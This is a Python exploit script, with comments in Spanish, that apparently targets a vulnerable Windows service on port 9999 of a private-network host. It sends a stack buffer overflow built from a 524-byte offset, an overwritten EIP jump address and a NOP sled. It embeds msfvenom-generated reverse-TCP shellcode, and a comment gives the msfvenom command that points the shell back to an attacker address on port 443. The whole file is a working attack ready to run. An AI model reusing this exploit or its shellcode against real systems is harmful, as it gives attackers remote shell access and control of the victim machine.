#!/usr/bin/env python3

import socket
import six
import sys
from pwn import *

# Variables Globales
Target 	= '172.168.1.176'
Port	= 9999
timeout = 5
p1 = log.progress("OverFlow")

def conexion():
	global sock
	try:
		p1.status("Iniciando Conexcion")

		# creando socket para conexion IPV4 usando TCP
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

		# tiempo de espera para recibir una respuesta del servidor
		sock.settimeout(timeout)

		# conectando con el servidor remoto
		connect = sock.connect((Target,Port))

		# Enviando informacion al servidor remoto por la conexion establecida
		Send_data()

	except Exception as error:
		log.failure(str(error))

def Send_data():
	try:
		p1.status("Enviando Informacion")
		offset = 524 # caracteres requeridos para el desbordamiento de memoria
		buffe = "A" * offset
		eip = "\xF3\x12\x17\x31"  #Jump Point sin bad chards 311712F3
		padding = ""   
		nops = "\x90" * 16  # Nops

# msfvenom -p windows/shell_reverse_tcp LHOST=172.168.1.159 LPORT=443 EXITFUNC=thread -b "\x00" -f c

		payload = ("\xdb\xd2\xd9\x74\x24\xf4\x5f\xbd\xdc\x18\x34\x35\x31\xc9\xb1"
"\x52\x83\xc7\x04\x31\x6f\x13\x03\xb3\x0b\xd6\xc0\xb7\xc4\x94"
"\x2b\x47\x15\xf9\xa2\xa2\x24\x39\xd0\xa7\x17\x89\x92\xe5\x9b"
"\x62\xf6\x1d\x2f\x06\xdf\x12\x98\xad\x39\x1d\x19\x9d\x7a\x3c"
"\x99\xdc\xae\x9e\xa0\x2e\xa3\xdf\xe5\x53\x4e\x8d\xbe\x18\xfd"
"\x21\xca\x55\x3e\xca\x80\x78\x46\x2f\x50\x7a\x67\xfe\xea\x25"
"\xa7\x01\x3e\x5e\xee\x19\x23\x5b\xb8\x92\x97\x17\x3b\x72\xe6"
"\xd8\x90\xbb\xc6\x2a\xe8\xfc\xe1\xd4\x9f\xf4\x11\x68\x98\xc3"
"\x68\xb6\x2d\xd7\xcb\x3d\x95\x33\xed\x92\x40\xb0\xe1\x5f\x06"
"\x9e\xe5\x5e\xcb\x95\x12\xea\xea\x79\x93\xa8\xc8\x5d\xff\x6b"
"\x70\xc4\xa5\xda\x8d\x16\x06\x82\x2b\x5d\xab\xd7\x41\x3c\xa4"
"\x14\x68\xbe\x34\x33\xfb\xcd\x06\x9c\x57\x59\x2b\x55\x7e\x9e"
"\x4c\x4c\xc6\x30\xb3\x6f\x37\x19\x70\x3b\x67\x31\x51\x44\xec"
"\xc1\x5e\x91\xa3\x91\xf0\x4a\x04\x41\xb1\x3a\xec\x8b\x3e\x64"
"\x0c\xb4\x94\x0d\xa7\x4f\x7f\x9e\x90\x4e\xe0\xb6\xe2\x50\x1f"
"\xfc\x6a\xb6\x75\x12\x3b\x61\xe2\x8b\x66\xf9\x93\x54\xbd\x84"
"\x94\xdf\x32\x79\x5a\x28\x3e\x69\x0b\xd8\x75\xd3\x9a\xe7\xa3"
"\x7b\x40\x75\x28\x7b\x0f\x66\xe7\x2c\x58\x58\xfe\xb8\x74\xc3"
"\xa8\xde\x84\x95\x93\x5a\x53\x66\x1d\x63\x16\xd2\x39\x73\xee"
"\xdb\x05\x27\xbe\x8d\xd3\x91\x78\x64\x92\x4b\xd3\xdb\x7c\x1b"
"\xa2\x17\xbf\x5d\xab\x7d\x49\x81\x1a\x28\x0c\xbe\x93\xbc\x98"
"\xc7\xc9\x5c\x66\x12\x4a\x7c\x85\xb6\xa7\x15\x10\x53\x0a\x78"
"\xa3\x8e\x49\x85\x20\x3a\x32\x72\x38\x4f\x37\x3e\xfe\xbc\x45"
"\x2f\x6b\xc2\xfa\x50\xbe")

		overflow = buffe + eip + padding + nops + payload

		# Recibiendo mensaje del servidor remoto
		sock.recv(1024)

		# Enviamos data al servidor remoto
		sock.send(six.b(overflow))

		# fin de la conexion con el servidor remoto
		sock.close()

	except Exception as error:
		log.failure(str(error))

if __name__ == '__main__':
	try:
		conexion() # iniciando funcion "Conexion"
		p1.success('Proceso Terminado')

	except KeyboardInterrupt: # mensaje a mostrar encaso de usar Crtl + C
		log.failure("Salida Forzada")